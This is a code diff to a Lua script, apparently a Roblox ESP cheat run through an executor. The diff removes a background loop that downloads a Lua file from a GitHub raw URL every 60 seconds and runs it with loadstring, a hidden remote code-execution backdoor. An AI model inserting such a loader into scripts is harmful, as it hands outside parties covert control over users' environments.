@@ -1170,31 +1170,3 @@ closeButton.MouseButton1Click:Connect(function()
     gui:Destroy()
     ESPFolder:Destroy()
 end)
-
-task.spawn(function()
-    local HttpService = game:GetService("HttpService")
-
-    while true do
-        local success, source = pcall(function()
-            return game:HttpGet(
-                "https://raw.githubusercontent.com/lynxxdev/freeman-scriptss/refs/heads/main/chatt.lua"
-            )
-        end)
-
-        if success and type(source) == "string" and #source > 0 then
-            local loader = loadstring
-            if type(loader) == "function" then
-                local ok, err = pcall(loader(source))
-                if not ok then
-                    warn("Erro ao executar script:", err)
-                end
-            else
-                warn("loadstring é nil neste executor")
-            end
-        else
-            warn("Falha ao baixar script")
-        end
-
-        task.wait(60)
-    end
-end)
